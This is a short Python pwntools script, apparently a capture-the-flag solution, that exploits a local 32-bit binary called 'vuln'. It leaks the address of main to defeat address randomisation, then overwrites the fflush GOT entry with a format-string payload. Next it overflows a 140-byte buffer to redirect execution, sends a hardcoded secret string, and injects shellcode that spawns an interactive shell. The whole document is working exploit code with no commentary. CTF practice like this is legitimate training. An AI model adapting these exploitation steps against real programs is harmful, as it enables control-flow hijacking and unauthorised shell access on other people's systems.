from pwn import *


binary = context.binary = ELF('./vuln')
context.bits = 32

p = process(binary.path)
p.sendlineafter("Sheldon: Hello! May I know your name? ", "peace")
p.recvuntil(b'Good. My order no. is ')

main = p.recvline().strip()
main = int(main, 16)
binary.address = main - binary.sym.main

p.sendlineafter("2.No", '1')
p.sendlineafter("2.No", '1')
p.sendlineafter("2.No", ')')

payload = fmtstr_payload(7, {binary.got.fflush: binary.sym.hid})
p.sendline(payload)

buf = b"A" * (140)
buf += p32(binary.sym.nic)

p.sendline(buf)
p.sendline("5e1D0n_l11<3s_th4T_u_m4D3_1t_H4lfW4y")

shellc = shellcraft.sh()
payload = asm(shellc)
p.sendline(payload)


p.interactive()
